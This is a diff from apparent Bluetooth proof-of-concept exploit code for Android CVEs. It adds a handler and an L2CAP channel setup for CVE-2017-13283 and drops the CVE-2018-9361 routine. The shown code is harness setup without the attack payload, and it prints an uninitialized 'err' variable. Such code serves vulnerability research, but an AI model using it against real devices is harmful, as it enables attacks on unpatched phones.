@@ -146,13 +146,49 @@ static void CVE_2019_2009_handler(uint8_t packet_type, uint16_t channel, uint8_t
  * and cmd code to DISCONNECTION_REQUEST
  */
 
-static void do_CVE_2018_9361() {
-    uint8_t status = l2cap_create_channel(l2cap_packet_handler, remote_addr, BLUETOOTH_PROTOCOL_SDP, l2cap_max_mtu(), NULL);
+static void do_CVE_2018_9419(int psm) {
+    uint8_t status = gap_connect(remote_addr, 1);
     printf("Status: %d\n", status);
 }
 
-static void do_CVE_2018_9419(int psm) {
-    uint8_t status = gap_connect(remote_addr, 1);
+static poc_channel_t poc_channel2;
+
+static uint8_t data_channel_buffer[1024];
+static void CVE_2017_13283_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
+{
+    if (packet_type != HCI_EVENT_PACKET)
+        return;
+    uint8_t err;
+    uint16_t event = hci_event_packet_get_type(packet);
+    switch (event)
+    {
+    case L2CAP_EVENT_LE_CHANNEL_OPENED:
+        poc_channel2.psm = l2cap_event_le_channel_opened_get_psm(packet);
+        poc_channel2.local_cid = l2cap_event_le_channel_opened_get_local_cid(packet);
+        poc_channel2.handle = l2cap_event_le_channel_opened_get_handle(packet);
+        if (packet[2] != 0)
+        {
+            printf("Connection failed: psm[0x%x] %d\n", poc_channel2.psm, packet[2]);
+        }
+        else
+        {
+            printf("Connected: psm[0x%x]\n", poc_channel2.psm);
+        }
+        l2cap_le_request_can_send_now_event(channel);
+        break;
+    case L2CAP_EVENT_LE_CHANNEL_CLOSED:
+        printf("Disconnected\n");
+        break;
+    case L2CAP_EVENT_LE_CAN_SEND_NOW:
+        printf("[*] error: %d\n", err);
+        break;
+    default:
+        printf("[*] event: 0x%x", event);
+    }
+}
+
+static void do_CVE_2017_13283() {
+    uint8_t status = l2cap_create_channel(CVE_2017_13283_handler, remote_addr, BLUETOOTH_PROTOCOL_AVCTP, l2cap_max_mtu(), NULL);
     printf("Status: %d\n", status);
 }
 
